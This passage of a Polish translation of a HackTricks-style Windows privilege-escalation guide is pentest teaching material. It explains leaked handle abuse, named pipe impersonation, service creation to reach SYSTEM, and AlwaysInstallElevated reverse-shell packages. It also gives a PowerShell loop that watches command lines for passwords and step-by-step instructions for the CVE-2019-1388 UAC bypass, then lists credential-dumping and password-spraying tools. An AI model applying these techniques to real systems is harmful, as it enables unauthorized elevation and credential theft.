Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedziczy wszystkie otwarte uchwyty głównego procesu**.\
Wtedy, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do procesu z uprawnieniami**, który został stworzony za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby uzyskać więcej informacji na temat **jak wykrywać i wykorzystywać tę lukę**.](leaked-handle-exploitation.md)\
[Przeczytaj ten **inny post, aby uzyskać bardziej szczegółowe wyjaśnienie, jak testować i nadużywać więcej otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, zwane **rurociągami**, umożliwiają komunikację procesów i transfer danych.

Windows oferuje funkcję zwaną **Named Pipes**, która pozwala niepowiązanym procesom na dzielenie się danymi, nawet przez różne sieci. Przypomina to architekturę klient/serwer, z rolami zdefiniowanymi jako **serwer rurociągu** i **klient rurociągu**.

Gdy dane są wysyłane przez rurociąg przez **klienta**, **serwer**, który skonfigurował rurociąg, ma możliwość **przyjęcia tożsamości** **klienta**, zakładając, że ma niezbędne **prawa SeImpersonate**. Identyfikacja **uprzywilejowanego procesu**, który komunikuje się przez rurociąg, którego możesz naśladować, stwarza możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy tylko wchodzi w interakcję z rurociągiem, który utworzyłeś. Instrukcje dotyczące przeprowadzenia takiego ataku można znaleźć w [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](./#from-high-integrity-to-system).

Ponadto następujące narzędzie pozwala na **przechwycenie komunikacji rurociągu za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala na wylistowanie i zobaczenie wszystkich rurociągów w celu znalezienia privesc** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

Podczas uzyskiwania powłoki jako użytkownik mogą być zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim stanem, wypisując wszelkie różnice.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Z niskiego użytkownika z uprawnieniami do NT\AUTHORITY SYSTEM (CVE-2019-1388) / Ominięcie UAC

Jeśli masz dostęp do interfejsu graficznego (poprzez konsolę lub RDP) i UAC jest włączone, w niektórych wersjach systemu Microsoft Windows możliwe jest uruchomienie terminala lub innego procesu, takiego jak "NT\AUTHORITY SYSTEM", z konta użytkownika bez uprawnień.

Umożliwia to jednoczesne podniesienie uprawnień i ominięcie UAC przy użyciu tej samej luki. Dodatkowo, nie ma potrzeby instalowania czegokolwiek, a binarny plik używany w trakcie procesu jest podpisany i wydany przez Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę lukę, należy wykonać następujące kroki:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Masz wszystkie niezbędne pliki i informacje w następującym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388

## Z poziomu Medium Administratora do poziomu High Integrity / Ominięcie UAC

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i omijaniu UAC:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Z High Integrity do System**

### **Nowa usługa**

Jeśli już działasz na procesie High Integrity, **przejście do SYSTEM** może być łatwe, po prostu **tworząc i uruchamiając nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Z procesu o wysokiej integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell używając opakowania _**.msi**_.\
[Więcej informacji na temat zaangażowanych kluczy rejestru i jak zainstalować pakiet _.msi_ tutaj.](./#alwaysinstallelevated)

### Wysokie uprawnienia + SeImpersonate do System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Z SeDebug + SeImpersonate do pełnych uprawnień tokena

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz to w już istniejącym procesie o wysokiej integralności), będziesz w stanie **otworzyć prawie każdy proces** (niechronione procesy) z uprawnieniami SeDebug, **skopiować token** procesu i stworzyć **dowolny proces z tym tokenem**.\
Używając tej techniki zazwyczaj **wybiera się dowolny proces działający jako SYSTEM z wszystkimi uprawnieniami tokena** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**Możesz znaleźć** [**przykład kodu wykonującego proponowaną technikę tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ta technika jest używana przez meterpreter do eskalacji w `getsystem`. Technika polega na **utworzeniu rury, a następnie utworzeniu/wykorzystaniu usługi do pisania na tej rurze**. Następnie **serwer**, który utworzył rurę używając uprawnienia **`SeImpersonate`**, będzie w stanie **podmienić token** klienta rury (usługę) uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o nazwanych rurach, powinieneś to przeczytać**](./#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**jak przejść z wysokiej integralności do Systemu używając nazwanych rur, powinieneś to przeczytać**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przechwycić dll** ładowany przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest również przydatny w tego rodzaju eskalacji uprawnień, a co więcej, jest **dużo łatwiejszy do osiągnięcia z procesu o wysokiej integralności**, ponieważ będzie miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/)**.**

### **Z Administratora lub Usługi Sieciowej do Systemu**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Z USŁUGI LOKALNEJ lub USŁUGI SIECIOWEJ do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne binaria impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania wektorów eskalacji uprawnień lokalnych w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdź błędne konfiguracje i wrażliwe pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdź niektóre możliwe błędne konfiguracje i zbierz informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdź błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje informacje o zapisanych sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough w lokalnym.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje dane uwierzytelniające z Menedżera poświadczeń. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozprzestrzenia zebrane hasła w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie do spoofingu PowerShell ADIDNS/LLMNR/mDNS/NBNS i man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja privesc w Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Szukaj znanych luk w privesc (DEPRECATED dla Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(Wymaga praw administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Szukaj znanych luk w privesc (wymaga kompilacji przy użyciu VisualStudio) ([**wstępnie skompilowane**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**wstępnie skompilowane**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje dane uwierzytelniające z wielu programów (wstępnie skompilowane exe w github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Sprawdź błędne konfiguracje (wykonywalny plik wstępnie skompilowany w github). Nie zalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdź możliwe błędne konfiguracje (exe z Pythona). Nie zalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego posta (nie wymaga accesschk do prawidłowego działania, ale może go używać).

**Lokalne**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt używając odpowiedniej wersji .NET ([zobacz to](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary, możesz to zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
